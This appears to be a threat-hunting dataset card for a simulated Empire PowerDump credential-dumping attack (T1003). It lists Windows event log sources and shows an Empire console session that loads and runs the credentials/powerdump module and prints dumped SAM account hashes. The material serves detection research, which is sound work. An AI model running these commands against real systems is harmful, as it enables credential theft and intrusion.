# Empire Powerdump

Dumping hashes from HKLM:\SAM\SAM\Domains\ registry keys.

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_powerdump.tar.gz](./empire_powerdump.tar.gz)

## Network Environment

Shire

## Time Taken

2019-06-25132210

## About this file

| log_name                                                           | source_name                                            | task                                                   |   record_number |
|--------------------------------------------------------------------|--------------------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                                                 | PowerShell                                             | Pipeline Execution Details                             |             286 |
| Windows PowerShell                                                 | PowerShell                                             | Provider Lifecycle                                     |               8 |
| Windows PowerShell                                                 | PowerShell                                             | Engine Lifecycle                                       |               1 |
| System                                                             | Service Control Manager                                | na                                                     |               4 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Registry                                               |             168 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Filtering Platform Connection                          |             145 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Token Right Adjusted Events                            |             132 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Handle Manipulation                                    |              54 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Group Membership                                       |              14 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Logon                                                  |              14 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Logoff                                                 |              12 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Other Object Access Events                             |              11 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Process Creation                                       |              10 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Process Termination                                    |              10 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | SAM                                                    |              10 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Detailed File Share                                    |               9 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Special Logon                                          |               5 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Sensitive Privilege Use                                |               4 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Authorization Policy Change                            |               3 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Kernel Object                                          |               3 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | File Share                                             |               1 |
| Microsoft-Windows-WMI-Activity/Operational                         | Microsoft-Windows-WMI-Activity                         | na                                                     |               2 |
| Microsoft-Windows-TerminalServices-LocalSessionManager/Operational | Microsoft-Windows-TerminalServices-LocalSessionManager | na                                                     |               6 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Image loaded (rule: ImageLoad)                         |             320 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Process accessed (rule: ProcessAccess)                 |             175 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Network connection detected (rule: NetworkConnect)     |             112 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Registry object added or deleted (rule: RegistryEvent) |              52 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | File created (rule: FileCreate)                        |              46 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Pipe Connected (rule: PipeEvent)                       |              32 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Process Create (rule: ProcessCreate)                   |              10 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Process terminated (rule: ProcessTerminate)            |              10 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Registry value set (rule: RegistryEvent)               |               6 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | RawAccessRead detected (rule: RawAccessRead)           |               1 |
| Microsoft-Windows-PowerShell/Operational                           | Microsoft-Windows-PowerShell                           | Executing Pipeline                                     |             241 |

## Attacker Activity

```
(Empire: Y298VW3B) > usemodule credentials/powerdump*
(Empire: powershell/credentials/powerdump) > info

              Name: Invoke-PowerDump
            Module: powershell/credentials/powerdump
        NeedsAdmin: True
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  DarkOperator
  winfang
  Kathy Peters
  ReL1K

Description:
  Dumps hashes from the local system using Posh-SecMod's
  Invoke-PowerDump

Comments:
  https://github.com/darkoperator/Posh-
  SecMod/blob/master/PostExploitation/PostExploitation.psm1

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        Y298VW3B                  Agent to run module on.                 

(Empire: powershell/credentials/powerdump) > execute
[*] Tasked Y298VW3B to run TASK_CMD_JOB
[*] Agent Y298VW3B tasked with task ID 4
[*] Tasked agent Y298VW3B to run module powershell/credentials/powerdump
(Empire: powershell/credentials/powerdump) > Job started: NPFW52
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


Nora:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

(Empire: powershell/credentials/powerdump) >
```